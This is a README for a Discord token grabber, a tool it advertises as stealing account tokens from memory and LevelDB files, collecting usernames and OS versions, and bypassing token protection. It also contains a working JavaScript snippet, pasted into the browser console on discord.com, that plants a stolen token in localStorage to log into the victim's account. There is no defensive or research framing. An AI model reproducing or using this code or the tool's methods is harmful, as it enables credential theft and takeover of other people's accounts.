# Discord-Token-Grabber
![Token-Stealer](https://i.imgur.com/cpK3bNV.jpeg)

# Features 
* Steal 
  * Token directly From memory 
  * Token from ldb files
  * username
  * os version
  * bypass any kind of token protection


# How to login using token
* open inspect element in https://discord.com/ ,copy and paste this code in console  

```js
function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}
```
* use `login("token");` then refresh the webpage ,and you will login automatically to the account using only token
